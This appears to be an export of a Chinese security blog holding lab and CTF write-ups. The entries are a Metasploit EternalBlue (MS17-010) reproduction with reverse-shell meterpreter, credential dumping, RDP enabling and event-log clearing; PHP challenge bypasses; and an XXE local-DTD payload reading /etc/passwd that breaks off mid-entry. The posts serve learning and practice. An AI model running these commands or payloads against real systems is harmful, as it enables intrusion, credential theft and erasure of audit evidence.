<p>使用永恒之蓝攻击模块：<code>exploit/windows/smb/ms17_010_eternalblue</code></p>
<p>设置载荷，设置rhosts</p>
<pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
<pre><code>set payload windows/x64/meterpreter/reverse_tcp</code></pre>
<pre><code>set rhosts 192.168.159.129</code></pre>
<p>exploit开始攻击</p>
<pre><code>meterpreter &gt; screenshot</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201200859337.png" alt="image-20220201200859337"></p>
<pre><code>meterpreter &gt; upload 1.xml c://</code></pre>
<pre><code>meterpreter &gt; download 1.xml c://</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201200928779.png" alt="image-20220201200928779"></p>
<pre><code>meterpreter &gt; shell</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201201000640.png" alt="image-20220201201000640"></p>
<p>进程迁移获取账号密码：</p>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220202172736488.png" alt="image-20220202172736488"></p>
<pre><code>meterpreter &gt; run post/windows/manage/enable_rdp</code></pre>
<p>查看用户空闲时长</p>
<pre><code>meterpreter &gt; idletime</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201201309035.png" alt="image-20220201201309035"></p>
<p>远程连接桌面</p>
<pre class=" language-shell"><code class="language-shell">root@h3ng:～# rdesktop 192.168.159.129</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201043624911.png" alt="image-20220201043624911"></p>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201045505203.png" alt="image-20220201045505203"></p>
<p>清除日志</p>
<pre><code>meterpreter &gt; clearev</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201045802374.png" alt="image-20220201045802374"></p>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201050201934.png" alt="image-20220201050201934"></p>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220201045828091.png" alt="image-20220201045828091"></p>
<p>监控</p>
<pre><code>meterpreter &gt; run vnc</code></pre>
<p><img src="/2022/02/01/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/ms17-010-yong-heng-zhi-lan-eternalblue-yuan-cheng-yi-chu-fu-xian/image-20220202173314869.png" alt="image-20220202173314869"></p>
<h2 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03    修复方案"></a>0x03    修复方案</h2><ul>
<li>关闭445端口</li>
<li>打开防火墙，安装安全软件</li>
<li>安装对应补丁</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>ROIS冬令营2022writeup</title>
    <url>/2022/01/27/rois-dong-ling-ying-2022writeup/rois-dong-ling-ying-2022writeup/</url>
    <content><![CDATA[<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>抓包js</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">_0x3c29</span><span class="token punctuation">(</span>_0x5a368d<span class="token punctuation">,</span>_0x14b903<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> _0x39eec9<span class="token operator">=</span><span class="token function">_0x39ee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> _0x3c29<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span>_0x3c2902<span class="token punctuation">,</span>_0x132228<span class="token punctuation">)</span><span class="token punctuation">{</span>
        _0x3c2902<span class="token operator">=</span>_0x3c2902<span class="token number">-0xae</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> _0xd47b4<span class="token operator">=</span>_0x39eec9<span class="token punctuation">[</span>_0x3c2902<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> _0xd47b4<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">_0x3c29</span><span class="token punctuation">(</span>_0x5a368d<span class="token punctuation">,</span>_0x14b903<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> _0x226551<span class="token operator">=</span>_0x3c29<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>_0x436477<span class="token punctuation">,</span>_0x24a335<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> _0xd3ee4d<span class="token operator">=</span>_0x3c29<span class="token punctuation">,</span>_0xe67260<span class="token operator">=</span><span class="token function">_0x436477</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">try</span><span class="token punctuation">{</span>
            <span class="token keyword">var</span> _0x2672af<span class="token operator">=</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x1</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xb5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x2</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xaf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x3</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xb3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x4</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xba</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x5</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xb8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x6</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xae</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xb2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x8</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xbb</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x9</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0xd3ee4d</span><span class="token punctuation">(</span><span class="token number">0xb6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>_0x2672af<span class="token operator">===</span>_0x24a335<span class="token punctuation">)</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> _0xe67260<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0xe67260<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span><span class="token punctuation">(</span>_0x5665be<span class="token punctuation">)</span><span class="token punctuation">{</span>
            _0xe67260<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0xe67260<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token punctuation">(</span>_0x39ee<span class="token punctuation">,</span><span class="token number">0xcf94a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token function">_0x226551</span><span class="token punctuation">(</span><span class="token number">0xb9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>true_flag<span class="token operator">=</span><span class="token string">'flag{source_u_know???}'</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">_0x39ee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> _0x5255d7<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'2528622GBPrlG'</span><span class="token punctuation">,</span><span class="token string">'1030jDfqbp'</span><span class="token punctuation">,</span><span class="token string">'href'</span><span class="token punctuation">,</span><span class="token string">'6263652TPpNGt'</span><span class="token punctuation">,</span><span class="token string">'Please give me your flag:'</span><span class="token punctuation">,</span><span class="token string">'30GNnFub'</span><span class="token punctuation">,</span><span class="token string">'26667KQnyLx'</span><span class="token punctuation">,</span><span class="token string">'7lUfINs'</span><span class="token punctuation">,</span><span class="token string">'63570PcKnXw'</span><span class="token punctuation">,</span><span class="token string">'179465EQIzFz'</span><span class="token punctuation">,</span><span class="token string">'I am sorry, your flag is different from mine'</span><span class="token punctuation">,</span><span class="token string">'9699720hAQMWD'</span><span class="token punctuation">,</span><span class="token string">'486332KQNgrG'</span><span class="token punctuation">,</span><span class="token string">'here is your flag hhhhh: '</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    _0x39ee<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> _0x5255d7<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">_0x39ee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>flag<span class="token operator">===</span>true_flag<span class="token operator">?</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x226551</span><span class="token punctuation">(</span><span class="token number">0xb4</span><span class="token punctuation">)</span><span class="token operator">+</span>true_flag<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x226551</span><span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>location<span class="token punctuation">[</span><span class="token function">_0x226551</span><span class="token punctuation">(</span><span class="token number">0xb7</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre><code>var flag=prompt(_0x226551(0xb9)),true_flag='flag{source_u_know???}';</code></pre>
<h2 id="pdd-pxx"><a href="#pdd-pxx" class="headerlink" title="pdd???pxx!!!"></a>pdd???pxx!!!</h2><p><img src="/2022/01/27/rois-dong-ling-ying-2022writeup/rois-dong-ling-ying-2022writeup/image-20220127181320919.png" alt="image-20220127181320919"></p>
<p>数值设定0-255</p>
<p><img src="/2022/01/27/rois-dong-ling-ying-2022writeup/rois-dong-ling-ying-2022writeup/image-20220127181408454.png" alt="image-20220127181408454"></p>
<h2 id="funny-calc"><a href="#funny-calc" class="headerlink" title="funny_calc"></a>funny_calc</h2><p><img src="/2022/01/27/rois-dong-ling-ying-2022writeup/rois-dong-ling-ying-2022writeup/image-20220127181444933.png" alt="image-20220127181444933"></p>
<p>等式用不成立，涉及到注入的本质</p>
<p><img src="/2022/01/27/rois-dong-ling-ying-2022writeup/rois-dong-ling-ying-2022writeup/image-20220127181552976.png" alt="image-20220127181552976"></p>
<h2 id="welcome1"><a href="#welcome1" class="headerlink" title="welcome1"></a>welcome1</h2><p>修改isadmin访问flag.php</p>
<p><img src="/2022/01/27/rois-dong-ling-ying-2022writeup/rois-dong-ling-ying-2022writeup/image-20220127181652629.png" alt="image-20220127181652629"></p>
<h2 id="welcome2"><a href="#welcome2" class="headerlink" title="welcome2"></a>welcome2</h2><pre class=" language-php"><code class="language-php">一题带你了解web
<span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"一题带你了解web&lt;br>"</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//------------------------level1------------------------</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'level1'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'hello'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level1'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'world'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span>"你需要了解一下什么是传参，常用工具hackbar<span class="token punctuation">,</span>burpsuit  https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//chrome.google.com/webstore/detail/ginpbkfigcoaokgflihfhhmglmbchinc ,burpsuit网上一堆我就不贴连接了&lt;br>");</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//------------------------level2------------------------</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level2'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$level2flag</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span>"level2passwd是<span class="token number">3</span>位纯数字，burpsuit有爆破模块，当然你写一个python脚本也是可以的<span class="token comment" spellcheck="true">//requests库");</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//------------------------level3------------------------</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level3'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$level3flag</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span>"敏感文件是什么？？常用工具dirsearch  https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//github.com/maurosoria/dirsearch/ 下载可能需要科学上网");</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//------------------------level4------------------------</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level4'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$level4flag</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"访问source.php，你知道什么是网页源码吗？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//------------------------level5------------------------</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level5-1'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level5-2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level5-1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level5-2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"php的某些特性"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//------------------------level6------------------------</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level6_'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'ROIS'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//想不到写啥，先放着，made by ccreat....</span>
<span class="token punctuation">}</span> 
</code></pre>
<p>一些trick</p>
<h2 id="R-U-admin"><a href="#R-U-admin" class="headerlink" title="R U admin"></a>R U admin</h2><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$is_admin</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$query_string</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$query_string</span><span class="token punctuation">,</span> <span class="token string">"is_admin"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker go away'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$is_admin</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'no admin, no flag'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> no admin<span class="token punctuation">,</span> no flag</code></pre>
<p>querystring读取get传参中问号后面的字符串，把下划线改成空格，空格会重新被解析成下划线</p>
<p><img src="/2022/01/27/rois-dong-ling-ying-2022writeup/rois-dong-ling-ying-2022writeup/image-20220127182036299.png" alt="image-20220127182036299"></p>
<h2 id="hash-collision"><a href="#hash-collision" class="headerlink" title="hash-collision"></a>hash-collision</h2><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!==</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> </code></pre>
<p>MD5强比较，数组绕过</p>
<pre><code>a[]=1&amp;b[]=2</code></pre>
<h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> @<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// flag in /flag </span></code></pre>
<p>构造不存在的文件</p>
<pre><code>?file=/a/../flag
flag{W0W_S7up1d_PHP_&gt;_&lt;}</code></pre>
]]></content>
  </entry>
  <entry>
    <title>GoogleCTF：2019-Bnv</title>
    <url>/2022/02/09/xxe/googlectf-2019-bnv/googlectf-2019-bnv/</url>
    <content><![CDATA[<p><img src="/2022/02/09/xxe/googlectf-2019-bnv/googlectf-2019-bnv/image-20220209224558272.png" alt="image-20220209224558272"></p>
<p>图片为盲文</p>
<p>盲文解密网站：<a href="https://www.pharmabraille.com/pharmaceutical-braille/the-braille-alphabet/">https://www.pharmabraille.com/pharmaceutical-braille/the-braille-alphabet/</a></p>
<h5 id="基于-Json-的-web-服务也有可能存在着-XXE-注入"><a href="#基于-Json-的-web-服务也有可能存在着-XXE-注入" class="headerlink" title="基于 Json 的 web 服务也有可能存在着 XXE 注入"></a>基于 Json 的 web 服务也有可能存在着 XXE 注入</h5><p>选择使用APIPost</p>
<p><img src="/2022/02/09/xxe/googlectf-2019-bnv/googlectf-2019-bnv/image-20220209225444897.png" alt="image-20220209225444897"></p>
<p>发送意义相同的XML</p>
<pre class=" language-dtd"><code class="language-dtd"><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE message[
    <!ELEMENT message ANY>
]>
<message>135601360123502401401250</message></code></pre>
<p><img src="/2022/02/09/xxe/googlectf-2019-bnv/googlectf-2019-bnv/image-20220209225506241.png" alt="image-20220209225506241"></p>
<p>本地DTD读取文件：</p>
<p>burp官网说明：<a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd">https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd</a></p>
<p>用本地DTD文件和XXE的本质：<a href="https://mohemiv.com/tags/xxe/">https://mohemiv.com/tags/xxe/</a></p>
<p>Linux设备可能在/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd中有一个DTD文件。并且这个文件又一个名为ISOamsa的实体，所以我们可以使用它来写DTD代码。现在我们来制作DTD代码。</p>
<p>首先我们读取了所需文件的内容，它可以是一个/flag，它也可以使/etc/password，然后我们可以尝试读取另一份文件，但是我们要确保第二个是个假文件名是我们刚刚读取第一份文件的内容，显然这会给我们一个错误，因为没有文件名作为第一个文件的内容，在错误中我们得到了文件的名称，我们尝试阅读那些意味着，我们也会取回第一个文件的内容，因此使用本地DTD，通过XXE读取任意文件</p>
<pre class=" language-dtd"><code class="language-dtd"><!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
